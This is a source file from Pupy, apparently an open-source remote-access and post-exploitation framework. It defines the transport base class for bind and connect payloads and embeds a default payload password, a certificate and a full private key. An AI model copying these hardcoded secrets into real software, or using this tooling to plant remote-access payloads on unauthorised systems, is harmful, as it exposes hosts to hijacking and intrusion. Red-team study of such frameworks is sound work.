# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
__all__=["Transport", "LAUNCHER_TYPE_ALL", "LAUNCHER_TYPE_BIND", "LAUNCHER_TYPE_CONNECT", "DEFAULT_RSA_PUB_KEY", "DEFAULT_SSL_BIND_CERT", "DEFAULT_SSL_BIND_KEY", "DEFAULT_BIND_PAYLOADS_PASSWORD"]

class TransportException(Exception):
    pass

LAUNCHER_TYPE_ALL=0
LAUNCHER_TYPE_CONNECT=1
LAUNCHER_TYPE_BIND=2

DEFAULT_BIND_PAYLOADS_PASSWORD="PuPyD3f4ultP4sSw0rd"

DEFAULT_RSA_PUB_KEY="""
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAu1AvqNawlgXdpT3s0/YoOSj3bSsGOd2UXrDKmEt3VkGvDVyxllwm
9TctdCIS8X9ziOtpSH2yYcS1zwVD0qb/Dt6im6Z0jiaiizsZPqJL16SfmP7b41ub
iCcM4a3gI1wRxt3HtBDgqPVZTqsKPsC3m6fiWfOQCy9CmLSBlwwE+9+elnUG4pvA
XQn0KDdrnzo5qGLxFyj9/jLI4y+rhS9DlwgsmFd42MCaJ/CgceM7QChN0zjxxT23
Y/RSR6wnYKasDbz7KoCa/QkYpvN4XqmvUZVQDI2y8F87ta/Cqo3UMEz5hNYt96LU
KN2qXNVOeiCO57tFFriWnKk6cAFHgrGzwA23xKUYB9/YivaEMjrh7C3907B+I1bK
t/BXOxdRwbTHkWQWrpxfUGs+5LJzwwsixzNJOifqgFyZTef6EyNTwSyr0oRslNk7
JIrE1Lab5Ve26+M92pCrs/UOIxpSWSKRmJeWcyAiw3crYrzAxC9r654BnmCfeWtn
MRAWmUrljx6aJSojTAbeY9aDDrYQRuQ7VevO+SHxYwOG/1Jq+qgznTN3zroUI97w
5g1oVVJrthUrYQZYKboaiEZmQckxLU5ca9pAyXu/o4pa1ez4a14YbollG9bjSnbK
+qRicAn26w5undwWlPX52DnrOw0v9sAqazfzG5rMH7mKWnSDvHPWOAsCAwEAAQ==
-----END RSA PUBLIC KEY-----
"""
DEFAULT_SSL_BIND_CERT = """
-----BEGIN CERTIFICATE-----
MIIDczCCAlugAwIBAgIJAK4ksVkg9NIlMA0GCSqGSIb3DQEBCwUAMFAxCzAJBgNV
BAYTAkZSMQwwCgYDVQQIDANQT1UxDjAMBgNVBAcMBUpBSVVZMQ8wDQYDVQQKDAZM
T0xJVEExEjAQBgNVBAsMCVMgQ09NTUUgPzAeFw0xNjA3MTUxODQyMTNaFw0xOTA0
MTExODQyMTNaMFAxCzAJBgNVBAYTAkZSMQwwCgYDVQQIDANQT1UxDjAMBgNVBAcM
BUpBSVVZMQ8wDQYDVQQKDAZMT0xJVEExEjAQBgNVBAsMCVMgQ09NTUUgPzCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANyq22QP5r5i9J3hfZDY0ja3098A
lAYUq7Ua62d1iJvsp7QyTLO8q5Q5MVkeUI+J2qU2VUPsCo6TA9qW9CYMEWAuRE50
oG/Q3lGCXmh6QoExgQs5BzVj0q9b+l+O9DYqt4SCwkp6jHRedM05W98L9qM1yPkc
bfQjWhN6V0kHjdVSchomReUtS5JrDasKklBSSJ2Au4bOTzt+VKO8YYEaC/sASBT+
W1Z5XfSDWxnDyks94GGEgIetMmFhYAlhy3cuWCmDCeLDZKmLYS1ufSyEGQBz002S
IedKJM9h/Cf64oNer1qgMYxdsX1zwSEhIZz7osk6H9eE/AgrHfnkWDNzjbMCAwEA
AaNQME4wHQYDVR0OBBYEFEhJiWWQoxVJK37zDDZzQhue/rxKMB8GA1UdIwQYMBaA
FEhJiWWQoxVJK37zDDZzQhue/rxKMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEL
BQADggEBAMWbHWK1ZJcTvsmaM9/7P0bpBmN8pg86nZBkGKdUjm2jPjIHOavW7pSU
VEhV1g6aXHX8E6eiG82uh49FCWcmWMbKGQFxpueCOR7cASbGeeIiOugnOoLtfS/D
PC39Fc2t6AqB1RfTlG66UFOIf2SRfHwP5JKSoKxwF/JYXoEppbiQ0ew2JXIsRzgI
+HHjl0I72fjwPi/f4LQh8cLvD4roiiuneCmqelsW3Bx9rZ9HMPCVhnmqHOgjgMV0
Yv+23qYfV56D4ZsKHzbYgb2RjfGKyN1tt8UfkpGSecekPN9yj6AiWAeG8DJcxWja
9CuF53F4g+3ShRW8KtA29CgJBq5PQFY=
-----END CERTIFICATE-----
"""
DEFAULT_SSL_BIND_KEY = """
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDcqttkD+a+YvSd
4X2Q2NI2t9PfAJQGFKu1GutndYib7Ke0MkyzvKuUOTFZHlCPidqlNlVD7AqOkwPa
lvQmDBFgLkROdKBv0N5Rgl5oekKBMYELOQc1Y9KvW/pfjvQ2KreEgsJKeox0XnTN
OVvfC/ajNcj5HG30I1oTeldJB43VUnIaJkXlLUuSaw2rCpJQUkidgLuGzk87flSj
vGGBGgv7AEgU/ltWeV30g1sZw8pLPeBhhICHrTJhYWAJYct3Llgpgwniw2Spi2Et
bn0shBkAc9NNkiHnSiTPYfwn+uKDXq9aoDGMXbF9c8EhISGc+6LJOh/XhPwIKx35
5Fgzc42zAgMBAAECggEAXBUgP/0yuLfqhAeYsl0IO7UyQJipLHBrxsNZAG9Xdlmn
Edb7kvVkVBIZuaqgy4UnLFIj+pgBP8WxkgH0F/xpM82ay3J3kLGEVFcmtkpufiL+
SoSdsXXacTrcnAu3dPMWacF2+kVxXw4bh5gr8kO3xBuppeprJ7mo2P/wdJUmZqGe
SjkZew7mn6CZrSzHZZRupw/qWCu6DcRZsj0I7UnaYDCQdz4ajB6Qn+Zm1wdATpl9
IYJpe93sIvcbcVgIHsGPoLgvgAWi+ShJBY4732/Ir5qqXcRcrBvvwNGayswONdpp
JczPjO1O0xoDxf7NeNHd8M6wuiFzNHzrTCkd+04pQQKBgQD5hhZUX+Y02A3x1QX5
Kw1txB199nV4gQ3fGdifktIGRKBEmqQwB4EJqSRHaaXMdh/rfK7xXGRiULNbRl9c
q2Fbf8THpgyNXVdlMRtcWQrGFLMHgo1llz5k6VqNPbEWQHUYKvu6hZSA5WuYW6Gt
U4K4k07a71Yo+/sMZS04x4qwKQKBgQDiZQoHuRh+WPGFmMZv3GfmT8JogrLBvvwg
tIysFF9j3P0xzBEjT+7i98UCacdtxUyTecm8kQYDipowRETOXOC8FuRpU3gYbELw
9cdzhdHWuiWTNk42yQ6Yucu2/WUo10HQ/yKPuQunb2Xj81eB2FMla8GxVcvskNkq
K8uVjR7aewKBgFJ3upGQUGlOru0qVpsPW5TXqFelSRXWsVr3E91JjRh9PeruoS0u
jbs/p7nidOWqdMpDnx4uRw8nVN/p1kKucbLn+4Vwn91o6CWNoVlYJHNrC/CDeXAG
GJ0JcuATb5/HFewy6Jew5m/jYzgrsLe0ThPqu7koOPW6sjJajiOh73hhAoGBAIXT
XD58d7IYOYzTZlmxW+mUtEK7H5fPoZJjp9QApvKNK05IZskM8xVPiTGH/c8xlbaH
g2zn/ToSsFpfwJyL4nzMu3BXWuJ0/I0bfC8Zp5TarGN88ncIGozFJ1qgJzAhLlKw
vmle5TiwbPZ2Xf/vNBcmv3RoVwccCIMZKFra9KYJAoGAXUN+JuAgg4PD895vHycu
lhQSPXHIeyYb66H3DxoeHB3zxTHKlWOekBWk2HQ/19THedXpY5hDKayvFLbTMNZz
ANvQJD17X6lG7svjuvIbB4EA4Ho9oWJfD+R6u8xpBFm2kqd0A2BqqOlyvkYtU4FD
ZWz7p5p+MA8a2SjqgYP6Dlo=
-----END PRIVATE KEY-----
"""



class Transport(object):
    info="no description available"
    server=None
    client=None
    client_kwargs={}
    authenticator=None
    stream=None
    client_transport=None
    server_transport=None
    dependencies=[] # dependencies needed when generating payloads
    credentials=[] # list of credentials to embbed during payload generation
    name=None
    launcher_type=LAUNCHER_TYPE_ALL

    def __init__(self, bind_payload=False):
        super(Transport, self).__init__()
        self.bind_payload=bind_payload
        if self.bind_payload:
            self.launcher_type=LAUNCHER_TYPE_BIND
        self.client_transport_kwargs={}
        self.server_transport_kwargs={}

    def parse_args(self, args):
        """ parse arguments and raise an error if there is missing/incorrect arguments """
        self.client_transport_kwargs.update(args)
        self.server_transport_kwargs.update(args)

